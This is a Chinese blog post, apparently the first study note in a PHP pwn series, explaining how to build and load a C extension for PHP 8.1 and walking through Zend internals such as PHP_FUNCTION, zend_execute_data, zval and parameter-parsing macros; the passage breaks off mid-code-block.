              <time title="创建时间：2024-06-19 20:44:54" itemprop="dateCreated datePublished" datetime="2024-06-19T20:44:54+08:00">2024-06-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-06-21 19:04:21" itemprop="dateModified" datetime="2024-06-21T19:04:21+08:00">2024-06-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">PHP pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>17 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近在D3CTF中发现了一道与PHP有关的Pwn题，当时由于事务繁忙没有及时学习，结果在不久之后的长城杯决赛中就遭到报应了，PHP pwn现场不会做。毕设做完之后，现在总算有时间拾起都有点陌生的CTF了。下面就来记录一下PHP pwn的学习过程。</p>
<h1 id="a-php-extensions-for-c"><a class="markdownIt-Anchor" href="#a-php-extensions-for-c"></a> A. PHP extensions for C</h1>
<p>在查阅资料后可以发现，实际上PHP pwn考的还是用户态pwn。具体而言，赛题一般使用的都是使用C语言编写的PHP扩展库文件。</p>
<p>PHP是一门基于C语言编写的高级语言，历史悠久。它支持使用C语言编写可直接用于PHP文件的二进制.so库文件。具体操作如下：</p>
<h2 id="1-运行环境与工作目录初始化"><a class="markdownIt-Anchor" href="#1-运行环境与工作目录初始化"></a> 1. 运行环境与工作目录初始化</h2>
<p>为方便实验，这里可以基于PHP docker容器完成下面的操作。笔者使用的是php:8.1-apache，这个版本是php的较新版本，且内置apache服务器与PHP源码，可以开箱即用。</p>
<p>在容器的<code>/usr/src</code>目录中保存有php 8.1版本的源码压缩包，解压即可。</p>
<p>在源码目录的ext目录中有一个PHP脚本<code>ext_skel.php</code>，运行后可指定目录与脚本名，用于生成PHP扩展的基础文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">root@4bc0fa317dea:/usr/src/php-8.1.1/ext# ./ext_skel.php --help</span><br><span class="line">WHAT IT IS</span><br><span class="line"></span><br><span class="line">  It&#x27;s a tool for automatically creating the basic framework for a PHP extension.</span><br><span class="line"></span><br><span class="line">HOW TO USE IT</span><br><span class="line"></span><br><span class="line">  Very simple. First, change to the ext/ directory of the PHP sources. Then run</span><br><span class="line">  the following</span><br><span class="line"></span><br><span class="line">    php ext_skel.php --ext extension_name</span><br><span class="line"></span><br><span class="line">  and everything you need will be placed in directory ext/extension_name.</span><br><span class="line"></span><br><span class="line">  If you don&#x27;t need to test the existence of any external header files,</span><br><span class="line">  libraries or functions in them, the extension is ready to be compiled in PHP.</span><br><span class="line">  To compile the extension run the following:</span><br><span class="line"></span><br><span class="line">    cd extension_name</span><br><span class="line">    phpize</span><br><span class="line">    ./configure</span><br><span class="line">    make</span><br><span class="line"></span><br><span class="line">  Don&#x27;t forget to run tests once the compilation is done:</span><br><span class="line"></span><br><span class="line">    make test</span><br><span class="line"></span><br><span class="line">  Alternatively, to compile extension in the PHP:</span><br><span class="line"></span><br><span class="line">    cd /path/to/php-src</span><br><span class="line">    ./buildconf</span><br><span class="line">    ./configure --enable-extension_name</span><br><span class="line">    make</span><br><span class="line">    make test TESTS=ext/extension_name/tests</span><br><span class="line"></span><br><span class="line">  The definition of PHP_extension_NAME_VERSION will be present in the</span><br><span class="line">  php_extension_name.h and injected into the zend_extension_entry definition.</span><br><span class="line">  This is required by the PECL website for the version string conformity checks</span><br><span class="line">  against package.xml</span><br><span class="line"></span><br><span class="line">SOURCE AND HEADER FILE NAME</span><br><span class="line"></span><br><span class="line">  The ext_skel.php script generates &#x27;extension_name.c&#x27; and &#x27;php_extension_name.h&#x27;</span><br><span class="line">  as the main source and header files. Keep these names.</span><br><span class="line"></span><br><span class="line">  extension functions (User functions) must be named</span><br><span class="line"></span><br><span class="line">  extension_name_function()</span><br><span class="line"></span><br><span class="line">  When you need to expose extension functions to other extensions, expose</span><br><span class="line">  functions strictly needed by others. Exposed internal function must be named</span><br><span class="line"></span><br><span class="line">  php_extension_name_function()</span><br><span class="line"></span><br><span class="line">  See also CODING_STANDARDS.md.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line"></span><br><span class="line">  php ext_skel.php --ext &lt;name&gt; [--experimental] [--author &lt;name&gt;]</span><br><span class="line">                   [--dir &lt;path&gt;] [--std] [--onlyunix]</span><br><span class="line">                   [--onlywindows] [--help]</span><br><span class="line"></span><br><span class="line">  --ext &lt;name&gt;          The name of the extension defined as &lt;name&gt;</span><br><span class="line">  --experimental        Passed if this extension is experimental, this creates</span><br><span class="line">                        the EXPERIMENTAL file in the root of the extension</span><br><span class="line">  --author &lt;name&gt;       Your name, this is used if --std is passed and for the</span><br><span class="line">                        CREDITS file</span><br><span class="line">  --dir &lt;path&gt;          Path to the directory for where extension should be</span><br><span class="line">                        created. Defaults to the directory of where this script</span><br><span class="line">                        lives</span><br><span class="line">  --std                 If passed, the standard header used in extensions that</span><br><span class="line">                        is included in the core, will be used</span><br><span class="line">  --onlyunix            Only generate configure scripts for Unix</span><br><span class="line">  --onlywindows         Only generate configure scripts for Windows</span><br><span class="line">  --help                This help</span><br></pre></td></tr></table></figure>
<p>基本只需要使用<code>--ext</code>与<code>--dir</code>选项即可。这里笔者将脚本目录设置为<code>/var/www/my_extension</code>。</p>
<p>执行命令后，在<code>/var/www/my_extension</code>中自动生成了一些文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@4bc0fa317dea:/var/www/my_extension/hello_phpext# ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 19 12:39 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Jun 19 12:36 ..</span><br><span class="line">-rw-r--r-- 1 root root  500 Jun 19 12:32 .gitignore</span><br><span class="line">-rw-r--r-- 1 root root 3490 Jun 19 12:32 config.m4</span><br><span class="line">-rw-r--r-- 1 root root  253 Jun 19 12:32 config.w32</span><br><span class="line">-rw-r--r-- 1 root root 1971 Jun 19 12:32 hello_phpext.c</span><br><span class="line">-rw-r--r-- 1 root root  110 Jun 19 12:32 hello_phpext.stub.php</span><br><span class="line">-rw-r--r-- 1 root root  558 Jun 19 12:32 hello_phpext_arginfo.h</span><br><span class="line">-rw-r--r-- 1 root root  372 Jun 19 12:32 php_hello_phpext.h</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jun 19 12:32 tests</span><br></pre></td></tr></table></figure>
<ul>
<li>config.m4：Unix下的Build Config配置文件，将通过它完成配置与安装。</li>
<li>hello_phpext.c：包含主要逻辑的C语言文件，我们扩展函数的保存位置。</li>
<li>php_hello_phpext.h：头文件，包含结构体定义等。</li>
</ul>
<h2 id="2-构建与加载"><a class="markdownIt-Anchor" href="#2-构建与加载"></a> 2. 构建与加载</h2>
<p>为方便后续对我们的扩展进行测试，首先需要搞清楚应该如何将扩展加载到PHP中。</p>
<p>使用下面的命令可以完成扩展加载：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>执行上述命令后，我们的PHP扩展库文件就被复制到了<code>/usr/local/lib/php/extensions/no-debug-non-zts-20210902</code>目录中。</p>
<p>随后，我们还需要修改<code>php.ini</code>文件。在8.1.1版本的PHP中，<code>/usr/local/etc/php</code>目录下有两个文件：<code>php.ini-development</code>与<code>php.ini-production</code>，前者一般用于开发调试而后者用于发布。这里使用前者，在代码中添加一行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=hello_phpext.so</span><br></pre></td></tr></table></figure>
<p>随后将其复制一份保存为php.ini，重启apache2服务，即可将我们的扩展加载到PHP中。</p>
<h2 id="3-关键结构定义"><a class="markdownIt-Anchor" href="#3-关键结构定义"></a> 3. 关键结构定义</h2>
<p>上述初始化操作完成后，hello_phpext.c中预先定义了一些必要的结构以及两个示例函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hello_phpext extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;php_hello_phpext.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hello_phpext_arginfo.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void test1() */</span></span><br><span class="line">PHP_FUNCTION(test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;hello_phpext&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string test2( [ string $var ] ) */</span></span><br><span class="line">PHP_FUNCTION(test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="type">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_OPTIONAL</span><br><span class="line">		<span class="title function_">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span><br><span class="line">	<span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION */</span></span><br><span class="line">PHP_RINIT_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLO_PHPEXT)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION */</span></span><br><span class="line">PHP_MINFO_FUNCTION(hello_phpext)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;hello_phpext support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; hello_phpext_module_entry */</span></span><br><span class="line">zend_module_entry hello_phpext_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;hello_phpext&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	ext_functions,					<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(hello_phpext),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(hello_phpext),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLO_PHPEXT_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_DL_HELLO_PHPEXT</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(hello_phpext)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这里包含了大量PHP相关的宏定义，一眼看过去确实难以理解，下面将结合PHP源码进行分析。</p>
<h3 id="php_function"><a class="markdownIt-Anchor" href="#php_function"></a> <code>PHP_FUNCTION</code></h3>
<p>这是用于定义PHP库函数的宏定义，在8.1.1版本PHP源码中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_API.h, line 71</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_NAMED_FUNCTION(name)		void ZEND_FASTCALL name(INTERNAL_FUNCTION_PARAMETERS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_FUNCTION(name)				ZEND_NAMED_FUNCTION(zif_##name)</span></span><br></pre></td></tr></table></figure>
<p>即上面的<code>PHP_FUNCTION(test1)</code>就相当于<code>void ZEND_FASTCALL test1(INTERNAL_FUNCTION_PARAMETERS)</code>。</p>
<h3 id="internal_function_parameters"><a class="markdownIt-Anchor" href="#internal_function_parameters"></a> <code>INTERNAL_FUNCTION_PARAMETERS</code></h3>
<p>上面的函数定义需要使用参数定义的相关宏定义<code>INTERNAL_FUNCTION_PARAMETERS</code>，它的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend.h, line 48</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_FUNCTION_PARAMETERS zend_execute_data *execute_data, zval *return_value</span></span><br></pre></td></tr></table></figure>
<p>即所有的PHP库函数都会通过第一个参数<code>execute_data</code>传入所有C函数需要的参数，由第二个参数<code>return_value</code>获取返回值，库函数本身的返回值恒为void。</p>
<h3 id="zend_execute_data等"><a class="markdownIt-Anchor" href="#zend_execute_data等"></a> <code>zend_execute_data</code>等</h3>
<p>这是一个结构体，用于保存C库函数的相关参数的数据结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_types.h, line 88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span>    <span class="title">zend_execute_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_compile.h, line 522</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">	zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">	zval                *return_value;</span><br><span class="line">	zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">	zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">	zend_execute_data   *prev_execute_data;</span><br><span class="line">	zend_array          *symbol_table;</span><br><span class="line">	<span class="type">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line">	zend_array          *extra_named_params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里引用了另外一些结构体，下面给出部分定义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_types.h, line 90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span>     <span class="title">zval</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_types.h, line 288</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="type">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="type">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> w1;</span><br><span class="line">		<span class="type">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，PHP使用<code>zend_value</code>定义PHP数据类型，包括整数、浮点数、数组、对象、函数、类等。</p>
<h3 id="zend_parse_parameters_start等"><a class="markdownIt-Anchor" href="#zend_parse_parameters_start等"></a> <code>ZEND_PARSE_PARAMETERS_START</code>等</h3>
<p>在C库函数中，有一个重要的流程——解析PHP参数。从上面的示例C文件中，可以看到这样一段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	Z_PARAM_OPTIONAL</span><br><span class="line">	<span class="title function_">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span><br><span class="line"><span class="title function_">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>
<p>这些宏定义均在<code>/Zend/zend_API.h</code>中定义，将这些宏全部展开带入参数之后，就变成了下面这个样子（已删除无效控制流）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ZEND_PARSE_PARAMETERS_START</span></span><br><span class="line"><span class="keyword">do</span> &#123; \</span><br><span class="line">		<span 